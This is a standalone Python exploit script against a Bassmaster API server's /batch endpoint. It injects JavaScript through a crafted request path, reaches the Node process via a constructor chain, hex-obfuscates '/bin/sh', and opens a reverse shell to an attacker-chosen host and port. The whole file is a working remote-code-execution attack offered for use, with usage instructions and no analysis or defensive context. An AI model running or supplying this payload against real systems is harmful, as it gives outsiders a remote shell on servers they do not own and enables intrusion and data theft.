import sys, requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    root = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
except Exception as e:
    print("[!] USAGE: python3 bassmaster_code-injection_to_rce.py [TARGET_URL] [LHOST] [LPORT]")
    print("[!] EXAMPLE: python3 bassmaster_code-injection_to_rce.py http://bassmaster-api-server.com:8000 192.168.1.1 4444")

print("[-] Sending exploit payload...")
url = f"{root}/batch"
netcat = f"{lport},'{lhost}'"
payload = '''id; process=ref.constructor.constructor('return (function(){return process})()')();var require = process.mainModule.require;function hex_to_ascii(str1){var hex  = str1.toString();var str = '';for (var n = 0; n < hex.length; n += 2) {str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));}return str;};var binsh=hex_to_ascii('2f')+'bin'+hex_to_ascii('2f')+'sh';var net = require('net'),sh = require('child_process').exec(binsh);var client = new net.Socket(); client.connect(''' + netcat + ''', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'''
data = { "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/profile" }, { "method": "get", "path": f"/test/$1.{payload}" }] }
j = json.dumps(data)
r = requests.post(url, json=data)
if r.status_code == 200:
    print("[+] Payload was delivered successfully!")
else:
    print("[!] Something went wrong -- exiting...")
    print("[!] Response: " + r.text)
    sys.exit(2)